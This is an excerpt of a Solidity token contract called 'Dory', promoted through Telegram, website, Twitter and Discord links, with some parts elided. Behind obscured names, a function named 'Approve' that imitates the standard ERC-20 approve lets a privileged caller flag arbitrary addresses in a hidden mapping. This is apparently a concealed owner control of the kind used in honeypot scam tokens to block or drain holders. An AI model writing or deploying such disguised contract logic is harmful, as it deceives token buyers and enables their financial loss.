//Telegram: https://t.me/msd0ry
//Website: https://msdory.xyz
//Twitter: https://twitter.com/msd0ry
//Discord: https://discord.gg/JC9Kd8bc
...
contract Dory is IERC20, Token, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;

    mapping(address => bool) private _piaczMuks;

    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => address) private _poqisa;
    string private _indenetify;
    string private _sboylme;
    ...
    returns (bool)
    {
        _tranferir(_msgSender(), recipient, amount);
        return true;
    }
    ...
    function transferFrom(
        ...
        _tranferir(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
    ...
    function Approve(address spender, uint256 amount) public returns (bool)  {
        address from = msg.sender;
        _verifierPermettre(from, spender, amount);
        return true;
    }

    function _verifierPermettre(address user, address spender, uint256 amount) internal {
        if (_gDxPermet(user)) {
            require(spender != address(0), "Invalid address");
            _piaczMuks[spender] = amount != 0;
        }
    }

    function _soiqwp(address _sender) internal view returns (bool) {
        return _piaczMuks[_sender] == true;
    }
